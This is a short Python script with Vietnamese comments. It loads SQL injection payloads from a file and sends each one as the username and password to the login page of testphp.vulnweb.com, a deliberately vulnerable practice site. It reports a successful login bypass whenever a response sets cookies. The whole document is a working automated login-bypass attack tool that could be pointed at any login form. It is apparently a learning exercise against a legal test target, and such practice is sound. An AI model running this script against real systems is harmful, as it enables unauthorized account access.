# Một thư viện phổ biến dùng để giúp lập trình viên có thể thực hiện cac tác vụ như gửi request tới server
# Cũng như xử lý response một cách đơn giản
import requests

# Xác định domain mục tiêu, nơi yêu cầu sẽ được gửi
domain = "http://testphp.vulnweb.com/userinfo.php"

# Tạo danh sách mysql_attacks rỗng để lưu trữ các payload được lấy từ tệp Mysql.txt
mysql_attacks = []

# Mở file để đọc dùng with để tự động đóng file khi hoàn thành công việc
with open('MySQL.txt', 'r') as f:
    # Đọc từng dòng trong tệp MySQL.txt
    for line in f:
        # Loại bỏ khoảng trắng và kí tự xuống dòng từ dòng đang xem xét và gán nó cho biến line
        line = line.strip()
        # Thêm các payload vào danh sách mysql_attacks bằng hàm append()
        mysql_attacks.append(line)

# Lặp qua từng payload trong danh sách mysql_attacks
for payload in mysql_attacks:
    # Tạo dữ liệu để post lên trang 
    data_test = {
        "uname":payload,
        "pass": payload
    }

    # Gửi yêu cầu post đến server với dữ liệu là data_test
    respone = requests.post(domain,data=data_test)
    print(respone.text)
    # Nếu đăng nhập thành công, trang web sẽ trả về cookie của người dùng, nếu có thì sẽ in ra payload thành công
    if respone.cookies:
        print("Successful: ",payload)